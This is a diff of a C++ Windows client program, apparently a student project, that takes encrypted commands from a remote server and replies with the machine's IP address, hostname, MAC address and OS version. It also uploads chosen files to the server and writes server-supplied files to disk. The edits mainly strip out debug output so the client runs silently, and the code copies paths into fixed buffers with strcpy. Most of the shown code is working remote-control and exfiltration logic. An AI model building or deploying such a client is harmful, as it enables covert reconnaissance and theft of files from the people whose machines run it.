@@ -178,7 +178,7 @@ void upload(SOCKET clientSocket, const char* filePath)
 
     // Read the contents of the text file into a string
     string fileContents((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
-    cout << "file contents in upload: " << fileContents << endl;
+    // cout << "file contents in upload: " << fileContents << endl;
 
     string encryptedContents = encrypt(fileContents);
     // Send the text file contents to the server
@@ -444,8 +444,7 @@ int main(int argc, char* arg[]) {
 
         if (byteCount > 0) {
             //Convert buffer to a readable string to compare inside the if statements
-            //string str(buffer); // buffer is already a char array - will otherwise be encoded incorrectly
-            printf("\nencrypted received command: %s\n", buffer);
+            // printf("\nencrypted received command: %s\n", buffer);
             
             string decryptedBuff = decrypt(string(buffer));
             strncpy(buffer, decryptedBuff.c_str(), decryptedBuff.size());
@@ -456,8 +455,6 @@ int main(int argc, char* arg[]) {
                 //Send IP Address
                 string ipAddress = getIpAddress();
                 if (ipAddress != "") {
-                    // const char* msg = ipAddress.c_str();
-                    // int bytesSent = send(clientSocket, msg, strlen(msg), 0);
                     
                     // encode ip
                     string encryptedIpAddress = encrypt(ipAddress);
@@ -480,8 +477,6 @@ int main(int argc, char* arg[]) {
                 DWORD size = sizeof(hostname) / sizeof(char);
 
                 if (GetComputerNameA(hostname, &size)) {
-                    // cout << "Message sent to server: " << hostname << endl;
-                    // send(clientSocket, hostname, strlen(hostname), 0);
                     
                     // encode hostname
                     string encryptedHostname = encrypt(string(hostname));
@@ -496,8 +491,6 @@ int main(int argc, char* arg[]) {
 
                 string MacAddress = getMacAddress();
                 if (MacAddress != "") {
-                    // const char* macmsg = MacAddress.c_str();
-                    // int bytesSent = send(clientSocket, macmsg, strlen(macmsg), 0);
                     
                     // encode mac
                     string encryptedMacAddress = encrypt(MacAddress);
@@ -517,7 +510,6 @@ int main(int argc, char* arg[]) {
                 //Send OS Version
 
                 string osMessage = getOS();
-                // int bytesSent = send(clientSocket, osMessage.c_str(), osMessage.size() + 1, 0);
                 
                 // encode os
                 string encryptedOsMessage = encrypt(osMessage);
@@ -539,10 +531,8 @@ int main(int argc, char* arg[]) {
                 tokenA = strtok(NULL, " "); // upload from path
                 char path[100];
                 strcpy(path, tokenA);
-                //path[strlen(path)-1] = '\0';
                 cout << "filename uploading from: " << path << endl;
                 upload(clientSocket, path);
-                //upload(clientSocket, "C:\\Users\\student\\Desktop\\test.txt"); 
             }
             else if (strstr(buffer, "DOWNLOAD")) {
                 char before[512];
@@ -556,13 +546,10 @@ int main(int argc, char* arg[]) {
                 tokenA = strtok(NULL, " "); // download to path
                 char path[100];
                 strcpy(path, tokenA);
-                // contents[strlen(contents)-1] = '\0';
                 
                 cout << " file download to: " << path << endl;
                 cout << " file contents: " << contents << endl;
-                // path[strlen(path)-1] = '\0';
                 download(clientSocket, path, contents);
-                // download(clientSocket, "C:\\Users\\student\\Desktop\\client_downloaded.txt", contents);
             }
             else if (strstr(buffer, "EXIT")) {
                 WSACleanup();
